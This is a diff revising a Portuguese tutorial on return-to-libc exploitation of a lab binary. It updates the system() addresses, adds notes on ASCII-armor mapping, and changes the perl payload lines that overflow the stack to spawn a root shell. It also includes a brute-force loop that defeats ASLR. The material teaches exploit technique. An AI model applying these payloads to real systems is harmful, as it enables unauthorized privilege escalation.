@@ -1,9 +1,9 @@
 ﻿Retornando para LibC / Ret2libc
 
-----[ Tema    : Retornando para LibC / Ret2libc ]
-----[ Autor   : m0nad [at] email.com            ]
-----[ Data    : 12/3/2010                       ]
-----[ Versão  : 1.0                             ]
+---- Tema    : Retornando para LibC / Ret2libc 
+---- Autor   : m0nad [at] email.com            
+---- Data    : 22/1/2012                       
+---- Versão  : 1.1                             
 
 
  --Índice
@@ -54,7 +54,10 @@ arbitrário.
 outros tipos de proteção, estou falando do SSP ( smash-the-stack-protection ) mas também 
 chamado de ProPolice, e com ASLR (Address Space Layout Randomization), precisamos desabilitar 
 essas proteções para ter sucesso na técnica, mas, no final também ensino a burlar uma delas ;).
-
+  Outra questão que vale levantar é o ASCII-Armor Address Mapping, que é o tipo de proteção
+que poe o null byte no endereço da system, caso sua distribuição tenha pode-se dar um printf
+na função system para e usar o endereço que ele irá imprimir, que é o endereço da parte de
+realocação, que não irá possuir nullbyte.
  
 - Desabilitando Proteções
  
@@ -158,10 +161,12 @@ Starting program: /home/m0nad/vuln ]
 
 Breakpoint 1, 0x080484b7 in main ()
 (gdb) p system
-$1 = {<text variable, no debug info>} 0x80483a0 <system@plt>
+$1 = {<text variable, no debug info>} 0xb7ecf180 <system>
+(gdb)
 
 
-  Outra maneira de se descobrir, e adicionando essa linha ao código
+  Outra maneira de se descobrir, ou caso em sua distro tenha ascii-armor, basta adicionar esta
+linha ao código:
 --
    printf ("system() = %p\n", system);
 --
@@ -180,7 +185,7 @@ call $endereco de system
 
   Quando a função call, é chamada, ela executa um push, ou seja, coloca na pilha, o endereço da 
 próxima instrução (endereço contido no program counter ou contador de instrução) e da um jump 
-para o código da função, no caso da função system().
+para o código da função, este é o endereço de retorno, no caso da função system().
 
   Bem, dito isso, sabemos que acima do endereço da função system, que vamos colocar no lugar do 
 endereço de retorno, colocaremos um endereço de retorno para a função system, podendo ser qualquer 
@@ -262,7 +267,7 @@ Seu conteúdo e':                                                    /bin/sh
 
   Pronto, já temos os endereços que precisamos.
 
-system 0x80483a0
+system 0xb7ecf180
 exit 0x80483f0
 /bin/sh  0xbffffdf5
 
@@ -276,7 +281,7 @@ exit 0x80483f0
 
   Agora vamos exploita-lo.
 
-$ ./vuln `perl -e 'print "A" x 16 . "\xa0\x83\x04\x08"."\xf0\x83\x04\x08"."\xf5\xfd\xff\xbf"'`
+$ ./vuln `perl -e 'print "A" x 16 . "\x80\xf1\xec\xb7" . "\xf0\x83\x04\x08" . "\xf5\xfd\xff\xbf"'`
 # id
 uid=1000(m0nad) gid=1000(m0nad) euid=0(root)
 #
@@ -290,7 +295,8 @@ do little endian, como na exploração de overflows normal.
 Vamos ativar o ASLR agora
 # echo 2 > /proc/sys/kernel/randomize_va_space
 
-  O endereço da função system não muda, mas a variável exportada muda, veja:
+  O endereço da função system na plt não muda, mas a variável exportada muda, veja:
+
 m0nad@desktop:~$ ./getenv TEST
 O endereço e': 0xbfaeddff
 Seu conteúdo e':                                                    /bin/sh
@@ -310,6 +316,9 @@ até que caia no nosso endereço, para fazer isso eh muito simples, vou utilizar
 0xbfb6bdff como exemplo:
 
 $ while true;do ./vuln `perl -e 'print "A" x 16 . "\xa0\x83\x04\x08"."\xf0\x83\x04\x08"."\xff\xbd\xf6\xbf"'`;done
+system() = 0x80483a0
+...
+system() = 0x80483a0
 # id
 uid=1000(m0nad) gid=1000(m0nad) euid=0(root)
 
@@ -336,12 +345,6 @@ http://www.acm.uiuc.edu/sigmil/talks/general_exploitation/arc_injection/arc_inje
 
 Bypassing non-executable-stack during exploitation using return-to-libc
 http://www.exploit-db.com/papers/31
-
-
-- Agradecimentos
-
-  Agradeço aos meus amigos do BugSec Team, Cooler_, _mlk_, i4k, sigsegv e bman.
-  Agradeço também ao IP_FIX, 0ut0fbound.
 
 
 
